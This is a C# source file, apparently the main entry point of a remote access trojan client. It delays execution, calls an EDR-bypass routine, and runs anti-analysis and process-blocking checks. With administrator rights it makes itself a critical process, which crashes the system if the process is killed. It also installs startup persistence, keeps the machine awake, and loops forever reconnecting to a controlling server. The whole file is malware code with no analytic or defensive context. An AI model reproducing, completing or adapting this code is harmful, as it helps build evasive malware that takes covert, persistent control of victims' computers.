using Client.Connection;
using Client.Helper;
using Client.Install;
using System;
using System.Threading;


namespace Client
{
    public class Program
    {
        public static void Main()
        {
            for (int index = 0; index < Convert.ToInt32(Settings.deLay); ++index)
                Thread.Sleep(1000);
            
            ByPass.Edr();

            if (!Settings.InitializeSettings())
                Environment.Exit(0);

            if (Convert.ToBoolean(Settings.anTi))
                Anti_Analysis.RunAntiAnalysis();

            if (!MutexControl.CreateMutex())
                Environment.Exit(0);

            if (Convert.ToBoolean(Settings.antiProcess))
                AntiProcess.StartBlock();

            if (Convert.ToBoolean(Settings.bsOd))
            {
                if (Methods.IsAdmin())
                    ProcessCritical.Set();
            }

            if (Convert.ToBoolean(Settings.inStall))
                NormalStartup.Install();

            Methods.PreventSleep();
            if (Methods.IsAdmin())
                Methods.ClearSetting();

            while (true)
            {
                if (!ClientSocket.IsConnected)
                {
                    ClientSocket.Reconnect();
                    ClientSocket.InitializeClient();
                }

                Thread.Sleep(5000);
            }
        }
    }
}